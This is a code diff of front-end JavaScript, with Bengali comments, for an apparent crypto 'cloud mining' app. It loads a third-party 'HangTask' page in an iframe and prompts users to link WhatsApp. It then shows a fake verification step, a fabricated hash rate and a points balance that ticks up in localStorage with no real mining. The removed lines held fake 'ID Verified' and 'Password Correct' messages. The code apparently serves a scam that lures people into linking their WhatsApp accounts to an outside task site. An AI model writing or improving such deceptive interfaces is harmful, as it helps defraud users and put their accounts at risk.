@@ -1,71 +1,61 @@
-// ১. লোডিং লজিক
-window.onload = function() {
-    let statusText = document.getElementById('load-status');
-    let detailText = document.getElementById('load-detail');
-    let startBtn = document.getElementById('start-btn');
-
-    setTimeout(() => { statusText.innerText = "ID Verified!"; detailText.innerText = "Encrypting Session..."; }, 1500);
-    setTimeout(() => { statusText.innerText = "Password Correct!"; detailText.innerText = "Checking Node Connection..."; }, 3000);
-    setTimeout(() => { 
-        statusText.innerText = "Load Complete!"; 
-        detailText.innerText = "Ready to Start Mining";
-        document.querySelector('.loader').style.display = 'none';
-        startBtn.style.display = 'block';
-    }, 4500);
-};
-
-function initApp() {
-    document.getElementById('loading-screen').style.display = 'none';
-    document.getElementById('main-app').classList.add('active');
-}
-
-// ২. মাইনিং ও ব্যালেন্স লজিক
-let balance = parseFloat(localStorage.getItem('cloud_pts')) || 0;
-const targetLinks = {
-    login: "https://www.taskm4u.com/#/login",
-    hang: "https://www.taskm4u.com/#/HangTask"
-};
+let balance = parseFloat(localStorage.getItem('saved_pts')) || 0;
+let isMining = localStorage.getItem('is_mining') === 'true';
 
 function handleStep() {
     const btn = document.getElementById('step-btn');
     const ifr = document.getElementById('taskIfr');
+    const ifrBox = document.getElementById('ifr-box');
 
     if (btn.innerText.includes("লগইন")) {
-        ifr.src = targetLinks.hang;
+        ifr.src = "https://www.taskm4u.com/#/HangTask";
+        ifrBox.classList.remove('scroll-locked');
+        ifrBox.classList.add('scroll-allowed');
         btn.innerText = "হোয়াটসঅ্যাপ যুক্ত করেছি (Verify)";
     } else {
         btn.innerText = "Verifying Connection...";
         btn.disabled = true;
         setTimeout(() => {
-            alert("সফলভাবে যুক্ত হয়েছে! মাইনিং চালু হলো।");
-            btn.innerText = "Node Connected (Online)";
-            btn.style.background = "#333";
-            startMining();
+            isMining = true;
+            localStorage.setItem('is_mining', 'true');
+            alert("Verification Success! Mining Started.");
+            showView('balance');
+            startMiningCycle();
         }, 4000);
     }
 }
 
-function startMining() {
+function startMiningCycle() {
+    if(!isMining) return;
+    
+    // এনিমেশন এবং স্ট্যাটাস আপডেট
+    document.getElementById('gear').style.display = 'block';
+    document.getElementById('p-light').classList.add('pulse');
+    document.getElementById('p-text').innerText = "Mining Active";
+    document.getElementById('p-text').style.color = "#25D366";
+    document.getElementById('h-rate').innerText = "32.45 GH/s";
+
     setInterval(() => {
-        balance += (30 / 3600);
+        balance += (30 / 3600); // ৩০ পয়েন্ট প্রতি ঘন্টা
         document.getElementById('main-bal').innerText = balance.toFixed(2) + " PT";
-        localStorage.setItem('cloud_pts', balance);
+        localStorage.setItem('saved_pts', balance);
     }, 1000);
 }
 
-// ৩. ভিউ সুইচিং
-function showView(viewId, element) {
+function showView(vId) {
     document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
     document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav'));
+
+    document.getElementById('view-' + vId).classList.add('active');
+    document.getElementById('n-' + vId).classList.add('active-nav');
     
-    document.getElementById('view-' + viewId).classList.add('active');
-    element.classList.add('active-nav');
-    
-    // ব্যালেন্স পেজ রিফ্রেশ
-    if(viewId === 'balance') {
+    if(vId === 'balance') {
         document.getElementById('main-bal').innerText = balance.toFixed(2) + " PT";
+        if(isMining) startMiningCycle();
     }
 }
 
-// শুরুতে আগের ব্যালেন্স লোড
+// পেজ লোড হলে মাইনিং চেক করা
+if(isMining) {
+    startMiningCycle();
+}
 document.getElementById('main-bal').innerText = balance.toFixed(2) + " PT";
